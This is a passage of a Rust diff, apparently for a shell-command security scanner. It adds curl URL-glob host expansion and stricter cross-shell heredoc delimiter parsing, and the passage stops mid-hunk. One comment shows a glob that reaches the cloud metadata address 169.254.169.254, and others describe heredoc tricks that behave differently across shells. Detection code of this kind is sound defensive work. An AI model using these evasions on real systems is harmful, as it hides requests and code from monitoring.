@@ -1873,6 +1873,10 @@ fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<Extrac
             .as_ref()
             .filter(|command| command.name == "curl")
             .map(|command| crate::rules::command::curl_url_operands(&command.args, shell));
+        let curl_globbing = resolved.as_ref().is_some_and(|command| {
+            command.name == "curl"
+                && crate::rules::command::curl_globbing_enabled(&command.args, shell)
+        });
 
         // Suppress URL extraction ONLY for the arg span of a first-segment
         // tirith inspection subcommand — not the whole segment. Leading env
@@ -2011,22 +2015,37 @@ fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<Extrac
             // curl does not use SCP's user@host:path shorthand. Its option
             // grammar decides which words are URL operands; parse those as
             // URL authorities even when the generic regex resembles SCP.
-            for raw in destinations {
-                let parsed = if has_leading_uri_scheme(raw) {
-                    // curl also accepts schemes outside URL_REGEX's generic
-                    // shortlist, including explicit scp:// and sftp:// URLs.
-                    parse_curl_destination(raw)
-                } else if let Some(parsed) = parse_curl_schemeless_destination(raw, true) {
-                    parsed
-                } else {
-                    continue;
+            let mut budget = MAX_CURL_GLOB_EXPANSIONS_PER_COMMAND;
+            for operand in destinations {
+                // curl's URL globbing reaches each host part the operand
+                // expands to (`http://{a,b}/`, `http://10.0.0.[1-2]/`). Past
+                // the budget the command rules report the operand unreadable.
+                let expanded = match curl_globbing
+                    .then(|| curl_host_glob(&operand.text, operand.curl_variables))
+                {
+                    Some(CurlHostGlob::Expanded(expansions)) if expansions.len() <= budget => {
+                        budget -= expansions.len();
+                        expansions
+                    }
+                    _ => Vec::new(),
                 };
-                results.push(ExtractedUrl {
-                    raw: raw.clone(),
-                    parsed,
-                    segment_index: seg_idx,
-                    in_sink_context: sink_context,
-                });
+                for raw in std::iter::once(&operand.text).chain(&expanded) {
+                    let parsed = if has_leading_uri_scheme(raw) {
+                        // curl also accepts schemes outside URL_REGEX's generic
+                        // shortlist, including explicit scp:// and sftp:// URLs.
+                        parse_curl_destination(raw)
+                    } else if let Some(parsed) = parse_curl_schemeless_destination(raw, true) {
+                        parsed
+                    } else {
+                        continue;
+                    };
+                    results.push(ExtractedUrl {
+                        raw: raw.clone(),
+                        parsed,
+                        segment_index: seg_idx,
+                        in_sink_context: sink_context,
+                    });
+                }
             }
         }
 
@@ -2599,12 +2618,542 @@ pub(crate) fn curl_destination_host(raw: &str) -> Option<String> {
     value.host().map(str::to_string)
 }
 
+/// Most combinations a curl URL glob before the end of the host is expanded
+/// to, and most distinct host parts (scheme, user, host and port) kept.
+const MAX_CURL_GLOB_COMBINATIONS: usize = 1024;
+const MAX_CURL_GLOB_HOST_PARTS: usize = 64;
+/// Most expanded host parts checked across all operands of one curl command;
+/// a globbed operand past it is unreadable.
+pub(crate) const MAX_CURL_GLOB_EXPANSIONS_PER_COMMAND: usize = 1024;
+
+/// How curl's URL globbing reads the host part of an operand.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum CurlHostGlob {
+    /// No `[...]` range or `{...}` set before the end of the host.
+    Plain,
+    /// The operand once per distinct expansion of its host part; the rest
+    /// of the operand is kept as written.
+    Expanded(Vec<String>),
+    /// More expansions than tirith checks, or a glob it cannot read where
+    /// curl may read one.
+    Unreadable,
+}
+
+/// Why the host part of a curl URL operand could not be expanded.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum CurlGlobError {
+    /// Not curl glob syntax: curl rejects the URL and makes no request.
+    Syntax,
+    /// More expansions than tirith checks.
+    TooLarge,
+}
+
+/// The host part of a curl URL operand, read the way curl's URL globbing
+/// (on unless `-g`/`--globoff`) reads it: `{a,b}` sets and `[0-9]` / `[a-z]`
+/// ranges (zero-padded, with an optional `:step`), with `\[`, `\]`, `\{` and
+/// `\}` escaped and a bracketed IPv6 address (or `[]`) taken as text. Each
+/// expansion is read up to the `/`, `?` or `#` that ends its host; curl takes
+/// one to three slashes after `scheme:`, so a glob can complete that separator
+/// (`http:/{/169.254.169.254,}`). Globs after the host never change it and are
+/// kept as written.
+///
+/// The operand is the word after quote removal, so a `${...}`, `$(...)`,
+/// `$[...]`, `$name[...]` or backtick in it may be text the shell replaces
+/// before curl runs. When the operand is not curl glob syntax as written
+/// (`${HOSTS[0]}`, `$hosts[1]`: curl would reject the URL and make no
+/// request), it is read again with that shell text as an opaque value.
+///
+/// With `curl_variables` (the value of `--expand-url` and the other
+/// `--expand-<option>` destinations) curl first replaces each `{{name}}`
+/// reference with the value of a `--variable`, so a reference is an opaque
+/// value and never glob syntax.
+pub(crate) fn curl_host_glob(raw: &str, curl_variables: bool) -> CurlHostGlob {
+    let read = match read_curl_host_glob(raw, false, curl_variables) {
+        Err(CurlGlobError::Syntax) if raw.contains(['$', '`']) => {
+            read_curl_host_glob(raw, true, curl_variables)
+        }
+        read => read,
+    };
+    match read {
+        Ok(None) => CurlHostGlob::Plain,
+        Ok(Some(expansions)) => CurlHostGlob::Expanded(expansions),
+        Err(_) => CurlHostGlob::Unreadable,
+    }
+}
+
+/// Where curl's URL parser is in one expansion of an operand.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum CurlUrlPart {
+    /// Before any `:`: a scheme name (`scheme`: still a valid one) or a
+    /// schemeless host.
+    Start { scheme: bool, empty: bool },
+    /// After `scheme:` and this many slashes.
+    Separator(u8),
+    /// The user, host and port.
+    Authority,
+}
+
+impl CurlUrlPart {
+    const BEGIN: Self = Self::Start {
+        scheme: true,
+        empty: true,
+    };
+
+    /// The part after `character`, or `None` when `character` ends the host.
+    fn after(self, character: char) -> Option<Self> {
+        match (self, character) {
+            (_, '?' | '#') => None,
+            (
+                Self::Start {
+                    scheme: true,
+                    empty: false,
+                },
+                ':',
+            ) => Some(Self::Separator(0)),
+            (Self::Start { .. } | Self::Authority, '/') => None,
+            (Self::Start { scheme, empty }, _) => Some(Self::Start {
+                scheme: scheme
+                    && if empty {
+                        character.is_ascii_alphabetic()
+                    } else {
+                        character.is_ascii_alphanumeric() || matches!(character, '+' | '.' | '-')
+                    },
+                empty: false,
+            }),
+            // curl takes one to three slashes; a fourth is an error.
+            (Self::Separator(slashes), '/') => {
+                (slashes < 3).then_some(Self::Separator(slashes + 1))
+            }
+            (Self::Separator(_) | Self::Authority, _) => Some(Self::Authority),
+        }
+    }
+}
+
+/// One expansion of a curl URL operand: open while its host part is read,
+/// then closed with the rest of the operand as written.
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct CurlGlobExpansion {
+    text: String,
+    /// `None` once the host has ended.
+    part: Option<CurlUrlPart>,
+}
+
+impl CurlGlobExpansion {
+    /// Append URL text. When a character of it ends the host, the rest of
+    /// `text` and then `rest` (the operand after it, as written) follow.
+    fn push_url_text(&mut self, text: &str, rest: &str) {
+        let Some(mut part) = self.part else {
+            return;
+        };
+        for (offset, character) in text.char_indices() {
+            self.text.push(character);
+            match part.after(character) {
+                Some(next) => part = next,
+                None => {
+                    self.text.push_str(&text[offset + character.len_utf8()..]);
+                    self.text.push_str(rest);
+                    self.part = None;
+                    return;
+                }
+            }
+        }
+        self.part = Some(part);
+    }
+
+    /// Append shell text whose value is unknown; it stays in the host part.
+    fn push_shell_text(&mut self, text: &str) {
+        if self.part.is_some() {
+            self.text.push_str(text);
+            self.part = Some(CurlUrlPart::Authority);
+        }
+    }
+}
+
+/// The distinct expansions of `raw` up to the end of each host, in curl's
+/// order (the last glob varies fastest), or `None` when no glob comes before
+/// the end of the host. With `shell_text`, shell expansions are opaque text;
+/// with `curl_variables`, so are curl `{{name}}` variable references.
+fn read_curl_host_glob(
+    raw: &str,
+    shell_text: bool,
+    curl_variables: bool,
+) -> Result<Option<Vec<String>>, CurlGlobError> {
+    let bytes = raw.as_bytes();
+    let mut expansions = vec![CurlGlobExpansion {
+        text: String::new(),
+        part: Some(CurlUrlPart::BEGIN),
+    }];
+    let mut combinations = 1usize;
+    let mut has_glob = false;
+    let mut index = 0usize;
+    while index < bytes.len() && expansions.iter().any(|expansion| expansion.part.is_some()) {
+        if curl_variables {
+            // curl turns `\{{` into a literal `{{`, which its globbing then
+            // rejects as a nested set.
+            if raw[index..].starts_with("\\{{") {
+                return Err(CurlGlobError::Syntax);
+            }
+            if let Some(end) = curl_variable_reference_end(raw, index) {
+                for expansion in &mut expansions {
+                    expansion.push_shell_text(&raw[index..end]);
+                }
+                index = end;
+                continue;
+            }
+        }
+        let (text, next) = match bytes[index] {
+            b'\\' if matches!(bytes.get(index + 1), Some(b'{' | b'[' | b'}' | b']')) => {
+                (&raw[index + 1..index + 2], index + 2)
+            }
+            b'[' if raw[index + 1..].starts_with(']') => (&raw[index..index + 2], index + 2),
+            b'[' if curl_glob_ipv6_literal_len(&raw[index..]).is_some() => {
+                let length = curl_glob_ipv6_literal_len(&raw[index..]).unwrap_or(1);
+                (&raw[index..index + length], index + length)
+            }
+            b'$' | b'`' if shell_text => match shell_expansion_end(raw, index) {
+                Some(end) => {
+                    let end = end.ok_or(CurlGlobError::Syntax)?;
+                    for expansion in &mut expansions {
+                        expansion.push_shell_text(&raw[index..end]);
+                    }
+                    index = end;
+                    continue;
+                }
+                None => (&raw[index..index + 1], index + 1),
+            },
+            open @ (b'[' | b'{') => {
+                let (values, next) = if open == b'[' {
+                    curl_glob_range(raw, index + 1)?
+                } else {
+                    curl_glob_set(raw, index + 1)?
+                };
+                combinations = combinations.saturating_mul(values.len());
+                if combinations > MAX_CURL_GLOB_COMBINATIONS {
+                    return Err(CurlGlobError::TooLarge);
+                }
+                has_glob = true;
+                let rest = &raw[next..];
+                let mut expanded: Vec<CurlGlobExpansion> = Vec::new();
+                for expansion in expansions {
+                    let choices = if expansion.part.is_some() {
+                        values
+                            .iter()
+                            .map(|value| {
+                                let mut choice = expansion.clone();
+                                choice.push_url_text(value, rest);
+                                choice
+                            })
+                            .collect()
+                    } else {
+                        vec![expansion]
+                    };
+                    for choice in choices {
+                        if expanded.contains(&choice) {
+                            continue;
+                        }
+                        if expanded.len() == MAX_CURL_GLOB_HOST_PARTS {
+                            return Err(CurlGlobError::TooLarge);
+                        }
+                        expanded.push(choice);
+                    }
+                }
+                expansions = expanded;
+                index = next;
+                continue;
+            }
+            b'}' | b']' => return Err(CurlGlobError::Syntax),
+            _ => {
+                let length = raw[index..].chars().next().map_or(1, char::len_utf8);
+                (&raw[index..index + length], index + length)
+            }
+        };
+        for expansion in &mut expansions {
+            expansion.push_url_text(text, &raw[next..]);
+        }
+        index = next;
+    }
+    if !has_glob {
+        return Ok(None);
+    }
+    let mut texts: Vec<String> = Vec::new();
+    for expansion in expansions {
+        if !texts.contains(&expansion.text) {
+            texts.push(expansion.text);
+        }
+    }
+    Ok(Some(texts))
+}
+
+/// The index after a curl variable reference starting at `raw[start]`:
+/// `{{name}}` or `{{name:function...}}`, with a name of 1 to 127 ASCII
+/// letters, digits and underscores, up to the first `}}`. Other `{{...}}`
+/// text curl keeps as written.
+fn curl_variable_reference_end(raw: &str, start: usize) -> Option<usize> {
+    let inner_start = start + 2;
+    if !raw.get(start..)?.starts_with("{{") {
+        return None;
+    }
+    let close = inner_start + raw.get(inner_start..)?.find("}}")?;
+    let inner = &raw[inner_start..close];
+    let name = inner.split(':').next().unwrap_or(inner);
+    let valid = (1..128).contains(&name.len())
+        && name
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_');
+    valid.then_some(close + 2)
+}
+
+/// The end of the shell expansion that starts at `raw[start]`: `${...}`,
+/// `$(...)`, `$[...]`, `$name[...]` or a backtick body. `None` when none
+/// starts there; `Some(None)` when it is not closed. Inside `${...}` only a
+/// nested `${`, `$(` or backtick opens a scope: the first other `}` closes it.
+fn shell_expansion_end(raw: &str, start: usize) -> Option<Option<usize>> {
+    let bytes = raw.as_bytes();
+    match (bytes[start], bytes.get(start + 1)) {
+        (b'`', _) => Some(backtick_body_end(bytes, start + 1)),
+        (b'$', Some(b'{')) => Some(parameter_expansion_end(bytes, start + 2)),
+        (b'$', Some(b'(')) => Some(balanced_end(bytes, start + 2, b'(', b')')),
+        (b'$', Some(b'[')) => Some(balanced_end(bytes, start + 2, b'[', b']')),
+        (b'$', Some(first)) if first.is_ascii_alphabetic() || *first == b'_' => {
+            let name_end = start
+                + 1
+                + bytes[start + 1..]
+                    .iter()
+                    .take_while(|byte| byte.is_ascii_alphanumeric() || **byte == b'_')
+                    .count();
+            (bytes.get(name_end) == Some(&b'['))
+                .then(|| balanced_end(bytes, name_end + 1, b'[', b']'))
+        }
+        _ => None,
+    }
+}
+
+/// The index after the backtick that closes a body starting at `from`.
+fn backtick_body_end(bytes: &[u8], from: usize) -> Option<usize> {
+    let mut index = from;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'\\' => index += 2,
+            b'`' => return Some(index + 1),
+            _ => index += 1,
+        }
+    }
+    None
+}
+
+/// The index after the `close` that balances an `open` before `from`.
+fn balanced_end(bytes: &[u8], from: usize, open: u8, close: u8) -> Option<usize> {
+    let mut depth = 1usize;
+    let mut index = from;
+    while index < bytes.len() {
+        let byte = bytes[index];
+        if byte == b'\\' {
+            index += 2;
+            continue;
+        }
+        if byte == open {
+            depth += 1;
+        } else if byte == close {
+            depth -= 1;
+            if depth == 0 {
+                return Some(index + 1);
+            }
+        }
+        index += 1;
+    }
+    None
+}
+
+/// The index after the `}` that closes a `${` before `from`.
+fn parameter_expansion_end(bytes: &[u8], from: usize) -> Option<usize> {
+    // The closer of each open scope: `}` for `${`, `)` for `$(` and for a
+    // `(` inside a `$(...)` body.
+    let mut closers = vec![b'}'];
+    let mut index = from;
+    while index < bytes.len() {
+        let closer = *closers.last()?;
+        match bytes[index] {
+            b'\\' => {
+                index += 2;
+                continue;
+            }
+            b'$' if matches!(bytes.get(index + 1), Some(b'{' | b'(')) => {
+                closers.push(if bytes[index + 1] == b'{' { b'}' } else { b')' });
+                index += 2;
+                continue;
+            }
+            b'`' => {
+                index = backtick_body_end(bytes, index + 1)?;
+                continue;
+            }
+            b'(' if closer == b')' => closers.push(b')'),
+            byte if byte == closer => {
+                closers.pop();
+                if closers.is_empty() {
+                    return Some(index + 1);
+                }
+            }
+            _ => {}
+        }
+        index += 1;
+    }
+    None
+}
+
+/// The length of a bracketed IPv6 address (`[::1]`, `[fe80::1%25eth0]`)
+/// at the start of `text`, which curl's globbing keeps as text.
+fn curl_glob_ipv6_literal_len(text: &str) -> Option<usize> {
+    let close = text.find(']')?;
+    if close + 1 >= 128 {
+        return None;
+    }
+    let inside = &text[1..close];
+    let address = inside.split('%').next().unwrap_or(inside);
+    address
+        .parse::<std::net::Ipv6Addr>()
+        .ok()
+        .map(|_| close + 1)
+}
+
+/// A curl `{a,b}` set starting after its `{`: its elements (a backslash
+/// escapes the next character; nested `{`/`[` and a stray `]` are errors) and
+/// the index after its `}`.
+fn curl_glob_set(raw: &str, start: usize) -> Result<(Vec<String>, usize), CurlGlobError> {
+    let mut elements = Vec::new();
+    let mut element = String::new();
+    let mut characters = raw[start..].char_indices();
+    while let Some((offset, character)) = characters.next() {
+        match character {
+            '}' => {
+                if offset == 0 {
+                    return Err(CurlGlobError::Syntax);
+                }
+                elements.push(element);
+                if elements.len() > MAX_CURL_GLOB_COMBINATIONS {
+                    return Err(CurlGlobError::TooLarge);
+                }
+                return Ok((elements, start + offset + 1));
+            }
+            ',' => {
+                elements.push(std::mem::take(&mut element));
+                if elements.len() > MAX_CURL_GLOB_COMBINATIONS {
+                    return Err(CurlGlobError::TooLarge);
+                }
+            }
+            '{' | '[' | ']' => return Err(CurlGlobError::Syntax),
+            '\\' => match characters.next() {
+                Some((_, escaped)) => element.push(escaped),
+                None => element.push('\\'),
+            },
+            other => element.push(other),
+        }
+    }
+    Err(CurlGlobError::Syntax)
+}
+
+/// A curl `[a-z]` / `[0-9]` range starting after its `[`, with an optional
+/// `:step`, as its values (numbers zero-padded to the width of a leading-zero
+/// start) and the index after its `]`.
+fn curl_glob_range(raw: &str, start: usize) -> Result<(Vec<String>, usize), CurlGlobError> {
+    let text = &raw[start..];
+    let bytes = text.as_bytes();
+    let first = *bytes.first().ok_or(CurlGlobError::Syntax)?;
+    let digits = |from: usize| {
+        bytes.get(from..).map_or(0, |rest| {
+            rest.iter().take_while(|byte| byte.is_ascii_digit()).count()
+        })
+    };
+    let (values, end): (Vec<String>, usize) = if first.is_ascii_alphabetic() {
+        let (min, max) = (first, *bytes.get(2).ok_or(CurlGlobError::Syntax)?);
+        if bytes.get(1) != Some(&b'-') {
+            return Err(CurlGlobError::Syntax);
+        }
+        let (step, end) = match bytes.get(3).ok_or(CurlGlobError::Syntax)? {
+            b']' => (1usize, 4),
+            b':' => {
+                let count = digits(4);
+                if count == 0 || bytes.get(4 + count) != Some(&b']') {
+                    return Err(CurlGlobError::Syntax);
+                }
+                (
+                    text[4..4 + count]
+                        .parse()
+                        .map_err(|_| CurlGlobError::Syntax)?,
+                    4 + count + 1,
+                )
+            }
+            _ => return Err(CurlGlobError::Syntax),
+        };
+        if step == 0
+            || (min == max && step != 1)
+            || (min != max && (min > max || step > usize::from(max - min) || max - min > 25))
+        {
+            return Err(CurlGlobError::Syntax);
+        }
+        let values = (min..=max)
+            .step_by(step)
+            .map(|byte| char::from(byte).to_string())
+            .collect();
+        (values, end)
+    } else if first.is_ascii_digit() {
+        let min_len = digits(0);
+        let pad = if first == b'0' { min_len } else { 0 };
+        let min: u64 = text[..min_len].parse().map_err(|_| CurlGlobError::Syntax)?;
+        if bytes.get(min_len) != Some(&b'-') {
+            return Err(CurlGlobError::Syntax);
+        }
+        let mut at = min_len + 1;
+        while matches!(bytes.get(at), Some(b' ' | b'\t')) {
+            at += 1;
+        }
+        let max_len = digits(at);
+        if max_len == 0 {
+            return Err(CurlGlobError::Syntax);
+        }
+        let max: u64 = text[at..at + max_len]
+            .parse()
+            .map_err(|_| CurlGlobError::Syntax)?;
+        at += max_len;
+        let step: u64 = if bytes.get(at) == Some(&b':') {
+            let count = digits(at + 1);
+            if count == 0 {
+                return Err(CurlGlobError::Syntax);
+            }
+            let step = text[at + 1..at + 1 + count]
+                .parse()
+                .map_err(|_| CurlGlobError::Syntax)?;
+            at += 1 + count;
+            step
+        } else {
+            1
+        };
+        if bytes.get(at) != Some(&b']')
+            || step == 0
+            || (min == max && step != 1)
+            || (min != max && (min > max || step > max - min))
+        {
+            return Err(CurlGlobError::Syntax);
+        }
+        let count = (max - min) / step + 1;
+        if count > MAX_CURL_GLOB_COMBINATIONS as u64 {
+            return Err(CurlGlobError::TooLarge);
+        }
+        let values = (0..count)
+            .map(|offset| format!("{:0pad$}", min + offset * step))
+            .collect();
+        (values, at + 1)
+    } else {
+        return Err(CurlGlobError::Syntax);
+    };
+    Ok((values, start + end))
+}
+
 fn push_urls_from_source_with_curl_operands(
     source: &str,
     shell: ShellType,
     segment_index: usize,
     in_sink_context: bool,
-    curl_operands: Option<&[String]>,
+    curl_operands: Option<&[crate::rules::command::FetchDestination]>,
     results: &mut Vec<ExtractedUrl>,
 ) {
     let normalized = crate::rules::command::normalize_shell_token(source, shell);
@@ -2619,6 +3168,7 @@ fn push_urls_from_source_with_curl_operands(
             // only a proven suffix of that same spelling, including attached
             // --url= / -x values. Other embedded URL text keeps its old scan.
             let starts_inside_operand_scheme = operands.iter().any(|operand| {
+                let operand = &operand.text;
                 if !has_leading_uri_scheme(operand) || operand.len() <= raw.len() {
                     return false;
                 }
@@ -2632,7 +3182,9 @@ fn push_urls_from_source_with_curl_operands(
                 continue;
             }
         }
-        let url = if curl_operands.is_some_and(|operands| operands.contains(&raw)) {
+        let url = if curl_operands
+            .is_some_and(|operands| operands.iter().any(|operand| operand.text == raw))
+        {
             parse_curl_destination(&raw)
         } else {
             parse::parse_url(&raw)
@@ -3880,8 +4432,12 @@ struct PosixHeredocSpec {
     delimiter: String,
     quoted: bool,
     strip_tabs: bool,
+    /// The header line ends in a CR right after the word (a CRLF line), so
+    /// the shells' delimiter is `delimiter` plus that CR.
+    word_ends_in_cr: bool,
     operator_range: std::ops::Range<usize>,
-    stdin: bool,
+    /// The descriptor the heredoc opens, without leading zeros (`0`: stdin).
+    fd: String,
 }
 
 #[derive(Debug, Default)]
@@ -3889,6 +4445,33 @@ struct PosixHeredocRecovery {
     sanitized: String,
     bodies: Vec<ExecutableBody>,
     gap: Option<ShellExecutionGap>,
+    spans: Vec<PosixHeredocSpan>,
+}
+
+/// Where one recovered POSIX heredoc sits in its source (byte offsets).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct PosixHeredocSpan {
+    /// The physical header line holding the `<<` operator (no newline).
+    pub header: std::ops::Range<usize>,
+    /// The operator and its delimiter word (`<<'EOF'`, `2<<-EOF`).
+    pub operator: std::ops::Range<usize>,
+    /// The body lines, without the terminator line.
+    pub body: std::ops::Range<usize>,
+    /// Body plus terminator line, including the terminator's newline.
+    pub through_terminator: std::ops::Range<usize>,
+    /// A quoted delimiter: the body is not expanded.
+    pub quoted: bool,
+}
+
+/// Every heredoc of a POSIX source with its exact position, or `None` when
+/// any heredoc is unsupported, unterminated, oversized or past the count
+/// bound (the same bounds as the executable-body recovery).
+pub(crate) fn posix_heredoc_spans(raw: &str) -> Option<Vec<PosixHeredocSpan>> {
+    let recovery = recover_posix_heredocs(raw);
+    if recovery.gap.is_some() {
+        return None;
+    }
+    Some(recovery.spans)
 }
 
 fn parse_posix_heredoc_delimiter(line: &str, operator: usize) -> Result<(String, bool, usize), ()> {
@@ -3911,31 +4494,98 @@ fn parse_posix_heredoc_delimiter(line: &str, operator: usize) -> Result<(String,
     let mut quote = None;
     let mut quoted = false;
     while let Some(&byte) = bytes.get(index) {
+        // `${...}`, `$(...)`, `$((...))`, `$[...]` or a backtick string in
+        // the word: the shells disagree about its extent and quote removal
+        // (zsh removes `\}` inside `${...}`, `\)` `\]` `\{` `\}` inside
+        // `$[...]` and keeps `\\` `\$` inside `$(...)`; bash honours nested
+        // quotes there). The terminator depends on the shell.
+        if quote != Some(b'\'')
+            && (byte == b'`'
+                || (byte == b'$' && matches!(bytes.get(index + 1), Some(b'{' | b'(' | b'['))))
+        {
+            return Err(());
+        }
+        // A `!` outside single quotes starts a history expansion in an
+        // interactive bash or zsh (on by default): `!#` is the line typed so
+        // far, so `cat <<E!#` reads `cat <<Ecat <<E` there (two heredocs),
+        // and `E!x` recalls an event. Batch shells keep the `!`. The
+        // terminator depends on the shell. Both shells leave an unquoted `!`
+        // alone before a blank, `=` or the end of the line, so the classic
+        // `<<!` and `<<END!` read the same everywhere (checked in bash 5.3
+        // and 3.2, dash, zsh 5.9 and ksh93, and interactive bash and zsh).
+        // Inside double quotes an interactive zsh reads even `<<"!"` to the
+        // end of the input.
+        if quote != Some(b'\'')
+            && byte == b'!'
+            && (quote.is_some()
+                || !matches!(bytes.get(index + 1), None | Some(b' ' | b'\t' | b'=')))
+        {
+            return Err(());
+        }
         if let Some(active) = quote {
             if byte == active {
                 quote = None;
                 quoted = true;
                 index += 1;
             } else if active == b'"' && byte == b'\\' {
-                let escaped = *bytes.get(index + 1).ok_or(())?;
-                delimiter.push(escaped);
+                // Inside double quotes a backslash quotes only `$`, `` ` ``,
+                // `"` and `\` (and a newline, which cannot occur inside one
+                // physical line). Before any other byte it stays part of the
+                // word: the terminator of `<<"E\OF"` is the line `E\OF`.
+                let next = *bytes.get(index + 1).ok_or(())?;
+                if next == b'!' {
+                    // An interactive zsh (history expansion is on by
+                    // default) removes this backslash; bash and dash keep it,
+                    // so the terminator line differs.
+                    return Err(());
+                }
+                if matches!(next, b'$' | b'`' | b'"' | b'\\') {
+                    delimiter.push(next);
+                    index += 2;
+                } else {
+                    delimiter.push(byte);
+                    index += 1;
+                }
                 quoted = true;
-                index += 2;
             } else {
                 delimiter.push(byte);
                 index += 1;
             }
             continue;
         }
+        if byte == b'$' && matches!(bytes.get(index + 1), Some(b'\'' | b'"')) {
+            // `$'...'` (ANSI-C) and `$"..."` (locale) quoting: bash, zsh and
+            // ksh translate the word, dash keeps the `$`, so the terminator
+            // line depends on the shell. The body boundary is ambiguous.
+            return Err(());
+        }
         if matches!(byte, b'\'' | b'"') {
             quote = Some(byte);
             quoted = true;
             index += 1;
         } else if byte == b'\\' {
-            delimiter.push(*bytes.get(index + 1).ok_or(())?);
+            let next = *bytes.get(index + 1).ok_or(())?;
+            if next == b'!' {
+                // An interactive zsh's history expansion consumes this
+                // backslash, so the heredoc is unquoted there (its body is
+                // expanded); bash and dash read a quoted one.
+                return Err(());
+            }
+            delimiter.push(next);
             quoted = true;
             index += 2;
-        } else if byte.is_ascii_whitespace() || b";&|<>()".contains(&byte) {
+        } else if byte == b'(' || (byte == b'<' && starts_zsh_numeric_glob(&bytes[index..])) {
+            // zsh keeps a glob group (`E(x)F`, `'E'(x)F`) or a numeric glob
+            // (`E<->F`) in the word, and so do bash with extglob and ksh for
+            // `E@(x)F`; bash and dash end the word before it (or reject the
+            // `(`). The terminator depends on the shell.
+            return Err(());
+        } else if byte == 0x0c || (byte == b'\r' && index + 1 < bytes.len()) {
+            // No shell ends a word at a form feed or at a carriage return
+            // inside the line. A CR that ends a CRLF line ends the word here
+            // and is matched by the terminator check.
+            return Err(());
+        } else if byte.is_ascii_whitespace() || b";&|<>)".contains(&byte) {
             break;
         } else {
             delimiter.push(byte);
@@ -3945,25 +4595,123 @@ fn parse_posix_heredoc_delimiter(line: &str, operator: usize) -> Result<(String,
             return Err(());
         }
     }
-    if quote.is_some() {
+    // A quoted or escaped CR is part of the word; terminator lines are
+    // compared with their trailing CR set aside, so they could not match it.
+    if quote.is_some() || delimiter.contains(&b'\r') {
         return Err(());
     }
     let delimiter = String::from_utf8(delimiter).map_err(|_| ())?;
     Ok((delimiter, quoted, index))
 }
 
+/// `<`, optional digits, `-`, optional digits, `>` at the start of `bytes`: a
+/// zsh numeric glob (`<->`, `<1-20>`), which zsh keeps inside a word.
+fn starts_zsh_numeric_glob(bytes: &[u8]) -> bool {
+    let after_digits = |from: usize| {
+        from + bytes.get(from..).map_or(0, |rest| {
+            rest.iter().take_while(|byte| byte.is_ascii_digit()).count()
+        })
+    };
+    let dash = after_digits(1);
+    bytes.get(dash) == Some(&b'-') && bytes.get(after_digits(dash + 1)) == Some(&b'>')
+}
+
+/// What [`posix_heredoc_specs`] is inside of at the end of a line, carried to
+/// the next line.
+#[derive(Clone, PartialEq, Eq)]
+struct PosixHeaderLex {
+    quote: ShellLexQuote,
+    /// The `$(` bodies opened inside double quotes, innermost last, each with
+    /// the number of `(` still open in it. The shells read such a body as
+    /// code with its own quotes, so `"$(cat <<'EOF'` opens a heredoc, and its
+    /// closing `)` resumes the double-quoted text.
+    double_quoted_bodies: Vec<usize>,
+    /// An arithmetic `((`/`$((` or a `${` left open at the end of a line,
+    /// with the number of `(` (or `{`) still open in it. A `<<` inside is a
+    /// shift or parameter text, never a heredoc operator.
+    inert: Option<(InertText, usize)>,
+    /// The line ended in a backslash-newline, so the next physical line
+    /// continues it; holds whether that line starts at a word start.
+    continued: Option<bool>,
+}
+
+/// Text the header reader skips without looking for operators.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum InertText {
+    Arithmetic,
+    Parameter,
+}
+
+impl Default for PosixHeaderLex {
+    fn default() -> Self {
+        Self {
+            quote: ShellLexQuote::Normal,
+            double_quoted_bodies: Vec::new(),
+            inert: None,
+            continued: None,
+        }
+    }
+}
+
 fn posix_heredoc_specs(
     line: &str,
-    initial_quote: ShellLexQuote,
-) -> (Vec<PosixHeredocSpec>, bool, ShellLexQuote) {
+    initial: PosixHeaderLex,
+) -> (Vec<PosixHeredocSpec>, bool, PosixHeaderLex) {
     let bytes = line.as_bytes();
     let mut specs = Vec::new();
-    let mut quote = initial_quote;
+    let PosixHeaderLex {
+        mut quote,
+        mut double_quoted_bodies,
+        mut inert,
+        continued,
+    } = initial;
     let mut unsupported = false;
     let mut index = 0usize;
-    let mut word_start = true;
+    let mut word_start = continued.unwrap_or(true);
+    let mut continues = None;
+    // The run of unescaped `$` just before `index` in double-quoted text.
+    let mut dollar_run = 0usize;
     while index < bytes.len() {
         let byte = bytes[index];
+        // A trailing backslash joins the next line to this one, except in
+        // single quotes (and a comment, which ends the scan below).
+        if byte == b'\\' && index + 1 == bytes.len() && quote != ShellLexQuote::Single {
+            continues = Some(word_start && quote == ShellLexQuote::Normal);
+            index += 1;
+            continue;
+        }
+        if let Some((kind, open)) = inert.as_mut() {
+            match quote {
+                ShellLexQuote::Single => {
+                    if byte == b'\'' {
+                        quote = ShellLexQuote::Normal;
+                    }
+                }
+                ShellLexQuote::Double => {
+                    if byte == b'\\' {
+                        index += 1;
+                    } else if byte == b'"' {
+                        quote = ShellLexQuote::Normal;
+                    }
+                }
+                ShellLexQuote::Normal => match (byte, *kind) {
+                    (b'\\', _) => index += 1,
+                    (b'\'', _) => quote = ShellLexQuote::Single,
+                    (b'"', _) => quote = ShellLexQuote::Double,
+                    (b'(', InertText::Arithmetic) | (b'{', InertText::Parameter) => *open += 1,
+                    (b')', InertText::Arithmetic) | (b'}', InertText::Parameter) => {
+                        *open -= 1;
+                        if *open == 0 {
+                            inert = None;
+                            word_start = false;
+                        }
+                    }
+                    _ => {}
+                },
+            }
+            index += 1;
+            continue;
+        }
         match quote {
             ShellLexQuote::Single => {
                 if byte == b'\'' {
@@ -3974,12 +4722,20 @@ fn posix_heredoc_specs(
             }
             ShellLexQuote::Double => {
                 if byte == b'\\' && index + 1 < bytes.len() {
+                    dollar_run = 0;
                     index += 2;
                     continue;
                 }
                 if byte == b'"' {
                     quote = ShellLexQuote::Normal;
+                } else if byte == b'(' && dollar_run % 2 == 1 {
+                    // `$(` after an odd run of `$` (`$$(` is the PID and a
+                    // plain `(` in every shell): code until its `)`.
+                    double_quoted_bodies.push(1);
+                    quote = ShellLexQuote::Normal;
